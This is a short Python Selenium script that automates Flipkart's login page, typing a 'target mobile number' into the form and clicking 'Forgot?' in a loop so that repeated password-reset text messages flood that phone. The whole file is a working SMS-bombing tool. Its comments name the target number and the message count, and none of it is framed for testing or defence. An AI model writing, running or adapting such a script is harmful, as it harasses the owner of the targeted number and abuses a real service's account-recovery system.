from selenium import webdriver
import time
b = webdriver.Chrome()

#frequency of sms
frequency=10

#target mobile number
mobile_number='1234567890'

for i in range(frequency):
    b.get('https://www.flipkart.com/account/login?ret=/')
    number = b.find_element_by_class_name('_2zrpKA')
    
    #make sure the number is registered on flipkart
    number.send_keys(mobile_number)
    forgot=b.find_element_by_link_text('Forgot?')
    forgot.click()
    
    #sleeping for 10 seconds
    time.sleep(10)
    
#Closing the browser
b.quit()
